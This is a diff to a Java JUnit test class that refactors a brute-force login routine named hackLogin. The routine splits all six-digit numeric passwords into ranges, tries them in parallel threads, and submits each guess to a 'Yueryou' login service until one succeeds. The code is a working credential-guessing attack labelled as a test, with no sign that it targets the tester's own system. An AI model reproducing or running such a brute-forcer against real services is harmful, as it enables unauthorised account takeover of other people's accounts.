@@ -2,7 +2,7 @@ package cn.colams.biz.haipi111;
 
 
 import cn.colams.biz.dalTest;
-import org.apache.commons.lang3.StringUtils;
+import cn.colams.common.utils.JacksonSerializerUtil;
 import org.junit.Test;
 import org.junit.runner.RunWith;
 import org.slf4j.Logger;
@@ -12,6 +12,7 @@ import org.springframework.boot.autoconfigure.SpringBootApplication;
 import org.springframework.boot.test.context.SpringBootTest;
 import org.springframework.test.context.junit4.SpringRunner;
 
+import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.concurrent.CompletableFuture;
@@ -41,22 +42,7 @@ public class YueryouBizTest {
 
     @Test
     public void testPostYueryou() throws ExecutionException, InterruptedException {
-        String result = hackLogin();
-        logger.info(result);
-    }
-
-    private String hackLogin() throws ExecutionException, InterruptedException {
-        List<String> stepList = Arrays.asList(
-                "0-100000",
-                "100001-200000",
-                "200001-300000",
-                "300001-400000",
-                "400001-500000",
-                "500001-600000",
-                "600001-700000",
-                "700001-800000",
-                "800001-900000",
-                "900001-999999");
+        List<String> stepList = initArray();
         List<CompletableFuture<String>> futures = stepList.stream()
                 .map(e -> CompletableFuture.supplyAsync(() ->
                                 loopHackLogin(e),
@@ -65,15 +51,23 @@ public class YueryouBizTest {
 
         CompletableFuture<Object> completableFuture = CompletableFuture.anyOf(futures.toArray(new CompletableFuture[futures.size()]));
         Object obj = completableFuture.get();
-        return String.valueOf(obj);
-        //        for (int i = 0; i < futures.size(); i++) {
-        //            String res = futures.get(i).get();
-        //            if (StringUtils.isNotEmpty(res)) {
-        //                result.append(res);
-        //                break;
-        //            }
-        //        }
-        //        return result.toString();
+        logger.info(String.valueOf(obj));
+    }
+
+    @Test
+    public void testInitArray() {
+        List<String> arrays = initArray();
+        logger.info(JacksonSerializerUtil.serialize(arrays));
+    }
+
+    private List<String> initArray() {
+        int step = 50000;
+        List<String> arrays = new ArrayList<>();
+        for (int i = 0; i * step <= 999999; i++) {
+            String ms = String.format("%s-%s", i * step, (i + 1) * step);
+            arrays.add(ms);
+        }
+        return arrays;
     }
 
     private String loopHackLogin(String step) {
@@ -81,7 +75,7 @@ public class YueryouBizTest {
 
         char[] charArray = new char[6];
         String password = null;
-        for (int i = array.get(0); i <= array.get(1); i++) {
+        for (int i = array.get(0); i < array.get(1); i++) {
             String tem = String.valueOf(i);
             char[] tempChar = tem.toCharArray();
             int n = charArray.length - tempChar.length;
@@ -97,7 +91,7 @@ public class YueryouBizTest {
             } else {
                 charArray = tempChar;
             }
-            //            char[] charArrayTemp = initCharArrayTemp(charArray);
+
             String pwd = String.copyValueOf(charArray);
             String result = yueryouBiz.postYueryou(pwd);
             logger.info(result);
